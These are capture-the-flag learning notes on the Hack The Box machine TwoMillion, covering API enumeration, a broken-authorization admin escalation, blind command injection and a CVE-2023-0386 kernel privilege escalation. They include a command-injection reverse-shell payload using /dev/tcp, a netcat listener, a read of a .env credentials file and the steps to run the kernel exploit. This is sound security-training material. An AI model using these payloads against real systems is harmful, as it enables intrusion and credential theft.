# HTB TwoMillion — Learning Notes

**Objective:** From web reconnaissance to user and root flags.  
**Techniques:** API enumeration, broken function-level authorization (BFLA), blind OS command injection, credential reuse, kernel privilege escalation.

## 1. Reconnaissance and access

```bash
nmap -sC -sV <TARGET_IP>
```

- **22/tcp:** SSH; **80/tcp:** nginx HTTP.
- HTTP redirected to `http://2million.htb/`. Map the hostname to the current HTB IP in `/etc/hosts`:

```text
<TARGET_IP> 2million.htb
```

- On `/invite`, inspect loaded JavaScript. An `eval(function(p,a,c,k,e,d){...})` wrapper was **Dean Edwards' Packer** obfuscation. Deobfuscation revealed:
  - `POST /api/v1/invite/how/to/generate`
  - `POST /api/v1/invite/verify`

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | python3 -m json.tool
```

- Response contained **ROT13** instructions pointing to `POST /api/v1/invite/generate`.
- The generated invitation code was **Base64** encoded; decode it (`base64 -D` on macOS, `base64 -d` on Linux), register, and log in.

**Lesson:** Inspect JavaScript, decode obfuscation/encoding, and enumerate API routes; neither ROT13 nor Base64 is secure encryption.

## 2. API discovery and application admin escalation

- A dashboard VPN-download action exposed an API under `/api/v1/user/...`.
- Requesting `GET /api/v1` while authenticated returned a route directory, including:

```text
GET  /api/v1/admin/auth
PUT  /api/v1/admin/settings/update
POST /api/v1/admin/vpn/generate
```

- `GET /api/v1/admin/auth` initially returned `{"message":false}`.
- Initially, admin requests returned **401** because the browser session was no longer authenticated. After logging in again, validation responses revealed required JSON fields: `is_admin` and `email`.
- In the authorized lab, the ordinary user could submit:

```http
PUT /api/v1/admin/settings/update
Content-Type: application/json

{"email":"<YOUR_REGISTERED_EMAIL>","is_admin":1}
```

- The response showed `is_admin: 1`; repeating `GET /api/v1/admin/auth` returned `{"message":true}`.

**Finding:** **BFLA / vertical privilege escalation** — a normal application user could change their own administrator status. An endpoint being listed, or returning HTTP 200, is *not* by itself evidence of a vulnerability; verify the actual state change.

## 3. Blind OS command injection → reverse shell

- The admin VPN endpoint accepts a `username` parameter:

```http
POST /api/v1/admin/vpn/generate
Content-Type: application/json

{"username":"<YOUR_USERNAME>"}
```

- A legitimate username returned an OpenVPN configuration; `username` with `;id` did **not** show `id` output.
- In **Burp Repeater**, a time-based test established command execution:

```json
{"username":"<YOUR_USERNAME>;sleep 5"}
```

- The request took about **5.5 seconds** compared with the normal baseline: strong evidence of **blind command injection**. The output of commands like `id` can be suppressed even if the commands execute.
- Determine the attacker VPN IP (`ifconfig` showed `utun6`, `10.10.15.76` during this lab), listen locally, and use the validated command-injection point to connect a reverse shell:

```bash
nc -lvn 4444
```

Example authorized-lab payload (replace IP with **your current HTB tunnel IP**):

```json
{"username":"<YOUR_USERNAME>;bash -c 'bash -i >& /dev/tcp/<YOUR_VPN_IP>/4444 0>&1'"}
```

- The shell ran as the web server user, `www-data`.

**Lesson:** Compare baseline vs modified requests; use timing when command output is not reflected. Keep the browser authenticated or preserve its session cookie in Burp.

## 4. Web shell → Linux user flag

- In the web directory, the hidden file `/var/www/html/.env` contained database connection settings and credentials.

```bash
whoami
pwd
cat /var/www/html/.env
ls -la /home
```

- The `admin` Linux account existed. The database password was **reused** for SSH authentication:

```bash
ssh admin@2million.htb
id
cat ~/user.txt
```

- The flag was initially unreadable from `www-data`, but accessible after logging in as `admin`.

**Lesson:** Application secrets may expose credentials that are reused across services. Database admin and Linux root are different identities. **Do not include discovered passwords or flags in public notes.**

## 5. Linux user → root (CVE-2023-0386)

- `/var/mail/admin` contained an email warning about an **OverlayFS/FUSE kernel CVE**.
- Environment checks showed:

```bash
uname -r                    # 5.15.70-051570-generic
cat /etc/os-release         # Ubuntu 22.04.2 LTS
which fusermount            # /usr/bin/fusermount
```

- The intended local escalation was **CVE-2023-0386**: improper ownership/permission handling during OverlayFS copy-up involving a FUSE-backed filesystem can enable a privileged executable.
- The public proof of concept was reviewed, transferred to the target, and compiled **on Linux** (the attacking Mac is Apple Silicon):

```bash
cd /tmp/CVE-2023-0386
make all
```

- In one SSH session, start the FUSE component; in a second, trigger the OverlayFS PoC:

```bash
./fuse ./ovlcap/lower ./gc   # Session 1
./exp                       # Session 2
```

- The resulting shell showed `uid=0(root)`; root access can be verified with `id` (no `sudo` needed), then the lab flag is at `/root/root.txt`.

**Lesson:** Kernel version + environmental clues guide CVE research, but version alone does not prove vulnerability. Inspect untrusted PoC code and test only in authorized labs.

## Reusable methodology

1. **Enumerate:** ports, hostnames/redirects, scripts, application actions, API routes.
2. **Map access controls:** distinguish authentication, authorization, and validation errors; confirm state changes.
3. **Prove injection safely:** baseline request → metacharacter test → measured time delay → command execution.
4. **Post-exploitation:** identify OS user, inspect relevant configuration, test credential reuse, obtain user access.
5. **Privilege escalation:** `sudo -l`, SUID, capabilities, processes, system mail, OS/kernel version, then targeted research.
6. **Document evidence:** exact request, response/status, timing, user identity, exploit prerequisites, and remediation.

**Defensive takeaways:** Enforce server-side role checks; never concatenate user input into shell commands (use safe argument arrays and strict validation); keep secrets out of accessible web directories; avoid password reuse; patch vulnerable kernels.

**References:** [GTFOBins](https://gtfobins.github.io/) · [CVE-2023-0386 PoC](https://github.com/xkaneiki/CVE-2023-0386)
